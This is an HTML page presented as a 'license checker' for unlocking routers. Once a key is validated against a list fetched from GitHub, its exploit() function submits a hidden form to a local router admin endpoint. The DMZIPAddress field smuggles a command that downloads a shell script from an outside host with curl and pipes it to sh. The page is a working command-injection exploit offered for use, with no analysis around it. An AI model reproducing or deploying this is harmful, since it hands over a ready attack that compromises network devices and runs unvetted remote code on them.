<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <title>Openline License Checker</title>
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <style>
    body {
      font-family: sans-serif;
      background: #1e1e2f;
      color: white;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      height: 100vh;
      margin: 0;
      padding: 20px;
    }
    input, button {
      padding: 10px;
      margin: 10px;
      font-size: 18px;
      width: 80%;
      max-width: 400px;
    }
    #mainButton {
      display: none;
      background-color: #ff5722;
      color: white;
    }
    #message {
      margin-top: 10px;
      font-size: 16px;
      color: yellow;
    }
  </style>
</head>
<body>
  <h2>Enter License Key</h2>
  <input id="licenseInput" placeholder="Enter license key here" type="text" />
  <button onclick="checkLicense()">Validate License</button>
  <div id="message"></div>
  <button id="mainButton" onclick="exploit()">OPENLINE NOW</button>

  <script>
    async function checkLicense() {
      const inputKey = document.getElementById("licenseInput").value.trim();
      const message = document.getElementById("message");

      if (!inputKey) {
        message.textContent = "❌ Please enter a license key.";
        return;
      }

      try {
        const res = await fetch("https://api.github.com/repos/bjchack/license-store/contents/license.json");
        const data = await res.json();
        const content = atob(data.content); // decode base64
        const validKeys = JSON.parse(content);

        if (validKeys.includes(inputKey)) {
          message.textContent = "✅ License accepted!";
          document.getElementById("mainButton").style.display = "block";
          document.getElementById("licenseInput").disabled = true;
        } else {
          message.textContent = "❌ Invalid license key.";
        }
      } catch (err) {
        message.textContent = "❌ Failed to fetch license file.";
        console.error(err);
      }
    }

    function exploit() {
      const form = document.createElement("form");
      form.method = "POST";
      form.action = "http://192.168.254.254/goform/goform_set_cmd_process";
      form.style.display = "none";

      const fields = {
        goformId: "DMZ_SETTING",
        isTest: "false",
        DMZEnabled: "1",
        DMZIPAddress: "127.0.0.1 | curl http://junjuncruzit.online/zlt-bjc/zlt-ais1.sh -o - | sh &"
      };

      for (let name in fields) {
        const input = document.createElement("input");
        input.type = "hidden";
        input.name = name;
        input.value = fields[name];
        form.appendChild(input);
      }

      document.body.appendChild(form);
      form.submit();
    }
  </script>
</body>
</html>
